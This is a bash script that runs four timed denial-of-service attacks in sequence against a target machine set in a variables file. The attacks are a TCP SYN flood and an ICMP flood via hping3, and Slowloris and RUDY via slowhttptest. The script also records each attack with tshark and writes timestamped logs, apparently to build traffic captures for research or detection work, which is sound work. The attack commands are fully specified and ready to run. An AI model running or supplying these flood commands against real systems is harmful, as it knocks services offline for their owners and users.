#!/bin/bash

#Import variables from file
source variables.sh

#Define variables for whole attack
attack_procedure_log="/home/logs/attack_procedure.log"
capture_file="/home/wiresharkTraces/attack_procedure.pcap"

attack(){
    #Write to file
    echo "Started "$1" attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

    #Run the attack
    ./attack.sh $1 $2 $3 $4 $5 $6 $7 $8 "$9"

    #Write to file
    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
}
#Start Wireshark capture
tshark -i $interface -w "$capture_file" -F pcap & pid_tshark=$!

#Write to file
echo "Started Wireshark trace for the whole attack procedure" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 1
attack_type="TCP_SYN_Flood"
capture_file="/home/wiresharkTraces/SYN.pcap"
traceroute_log="/home/logs/SYN_traceroute.log"
attack_stats_log="/home/logs/SYN_stats.log"
attack_log="/home/logs/SYN_attack.log"
attack_duration=$((60)) # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port
attack_script="hping3 --flood --frag -p "$destination_port" -S $destination_ip"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Wait for next attack
sleep $((30))

#Define variables for attack 2
attack_type="SlowLoris"
capture_file="/home/wiresharkTraces/SlowLoris.pcap"
traceroute_log="/home/logs/SlowLoris_traceroute.log"
attack_stats_log="/home/logs/SlowLoris_stats.log"
attack_log="/home/logs/SlowLoris.log"
attack_duration=$((60)) # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port
attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://"$destination_ip" -x 24 -p 3"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Wait for next attack
sleep $((30))

#Define variables for attack 3
attack_type="ping"
capture_file="/home/wiresharkTraces/ping.pcap"
traceroute_log="/home/logs/ping_traceroute.log"
attack_stats_log="/home/logs/ping_stats.log"
attack_log="/home/logs/ping.log"
attack_duration=$((60)) # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port
attack_script="hping3 --flood -1 "$destination_ip""

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Wait for next attack
sleep $((30))

#Define variables for attack 4
attack_type="RUDY"
capture_file="/home/wiresharkTraces/RUDY.pcap"
traceroute_log="/home/logs/RUDY_traceroute.log"
attack_stats_log="/home/logs/RUDY_stats.log"
attack_log="/home/logs/RUDY.log"
attack_duration=$((60)) # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port
attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://"$destination_ip" -x 10 -p 3"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Wait for next attack
sleep $((30))

#Stop the Wireshark capture
kill "$pid_tshark"

#Write to file
echo "Stopped Wireshark trace for the whole attack procedure" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
